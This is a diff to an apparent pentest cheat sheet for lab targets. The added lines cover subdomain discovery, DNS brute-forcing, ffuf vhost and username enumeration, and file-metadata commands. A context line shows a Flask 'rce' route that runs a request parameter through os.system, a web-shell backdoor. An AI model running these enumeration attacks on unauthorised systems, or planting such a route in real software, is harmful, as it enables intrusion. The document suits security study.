@@ -10,6 +10,10 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20
 https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee           # SSTI in FLASK
 https://wiki.owasp.org/index.php/OWASP_favicon_database                           # Databse of framework by favicon  OWASP DB
 https://github.com/danielmiessler/SecLists                                        # Wordlists 
+  
+https://crt.sh                                                                    # Discover subdomains belonging to a domain by cert
+https://transparencyreport.google.com/https/certificates                          # Discover subdomains belonging to a domain by cert
+google: "-site:www.domain.com site:*.domain.com"                                  #
 
 
 ######################## Enumerate host ##############################################
@@ -19,11 +23,14 @@ nmap -p- -T4 targetip -Pn                                                       
 nmap -p 1-500 -sU -T4 targetip -Pn                                                 # enumerate  UDP ports
 smbmap -H 10.10.11.152 -u "" -p ""                                                 # enumerate SMB
 smbclient -L //10.10.11.152/ -N                                                    # enumerate SMB 
+dnsrecon -t brt -d <site.name>                                                     # DNS Bruteforce enumeration domain
+./sublist3r.py -d acmeitsupport.thm                                                # DNS enumeration domain
 dig axfr <hostname> @<dns/hostip>                                                  # DNS zone transfer
+ffuf -w /wordlist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.11.204     # Dir fuzzing subdomain
 ffuf -w /wordlist.txt -u http://10.10.90.15/FUZZ                                   # Dir fuzzing  
 dirb http://10.10.90.15/ /wordlist.txt                                             # Dir fuzzing  
 gobuster dir --url http://10.10.90.15/ -w /wordlist.txt                            # Dir fuzzing
-
+ffuf -w /wordlist.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u <site> -mr "username already exists"
 
 curl <hostname> -I                                                                 # Get response header
 curl <hostname> -v                                                                 # Verbose mode with header
@@ -99,7 +106,9 @@ def rce():
   return os.system(request.args.get('cmd'))
 
 
-
+############################### Forensic ##########################################
+pdfinfo <file.pdf>                                                                  # Get meta info from pdf files
+exiftool <file.pdf>                                                                 # Get meta info from images files
 
 
 
